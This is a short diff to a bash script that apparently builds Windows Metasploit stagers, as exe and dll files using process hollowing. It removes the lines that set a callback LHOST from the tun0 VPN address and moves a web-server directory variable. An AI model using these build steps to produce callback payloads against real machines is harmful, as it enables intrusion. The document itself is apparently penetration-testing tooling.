@@ -1,10 +1,6 @@
 #!/bin/bash
-WEBDIR=/var/www/html
-
 set -ex
-IP=`ifconfig tun0 | grep "inet "|awk '{print $2}'`
-echo "Updating IP to $IP"
-sed -i 's/^LHOST.*/LHOST="'"$IP"'"/' ak.py
+WEBDIR=/var/www/html
 
 python3 generate_win_msf_stager.py --injection hollow --format exe
 python3 generate_win_msf_stager.py --injection hollow --format dll
